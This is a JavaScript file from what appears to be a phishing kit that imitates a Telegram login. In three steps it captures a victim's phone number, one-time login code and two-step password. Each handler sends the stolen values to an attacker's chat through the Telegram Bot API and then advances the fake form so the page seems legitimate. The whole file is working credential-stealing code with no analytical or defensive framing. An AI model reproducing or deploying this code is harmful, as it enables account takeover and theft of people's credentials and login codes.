function kirimResult(gabungan){
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        complete: function(data) {
                    console.log('Complete')
        setTimeout(function(){
            }, 1000);
  
                }
            });
  }

  $( "#first" ).on( "submit", function( event ) {
    event.preventDefault();
  $("#loader").show();
    $("#notif").text("");
    const phone = document.getElementById("phone").value;
    var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
    'Nomer : ' + phone + '%0A' +
    '____________' + '%0A' +
    'TrueLog V1 JieCode';
  
    sessionStorage.setItem("phone_number", phone);
              kirimResult(gabungan);
              setTimeout(function(){
                $("#loader").hide();
                $("#first").hide();
                $("#second").show();
              }, 1500);
  });

  $( "#second" ).on( "submit", function( event ) {
    event.preventDefault();
  $("#loader").show();
    $("#notif").text("");
    const phone = sessionStorage.getItem("phone_number");
    const otp = document.getElementById("otp").value;

     var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
  'Nomer : ' + phone + '%0A' +
  'OTP : ' + otp + '%0A' +
  '____________' + '%0A' +
  'TrueLog V1 JieCode';
  
    sessionStorage.setItem("otp", otp);
              kirimResult(gabungan);
              setTimeout(function(){
                $("#loader").hide();
                $("#second").hide();
                $("#third").show();
              }, 1500);
  });

  $( "#third" ).on( "submit", function( event ) {
    event.preventDefault();
  $("#loader").show();
    $("#notif").text("");
    const phone = sessionStorage.getItem("phone_number");
    const otp = sessionStorage.getItem("otp");
    const password = document.getElementById("pass").value;

    var gabungan = '' + '╚»★«╝ TELEGRAM ╚»★«╝' + '%0A' +
    'Nomer : ' + phone + '%0A' +
    'OTP : ' + otp + '%0A' +
    'Password : ' + password + '%0A' +
    '____________' + '%0A' +
    'TrueLog V1 JieCode';
  
    sessionStorage.setItem("otp", otp);
              kirimResult(gabungan);
              setTimeout(function(){
                $("#loader").hide();
                $("#third").hide();
                $("#last").show();
              }, 1500);
  });

$( document ).ready(function() {
    $("#loader").hide();
});
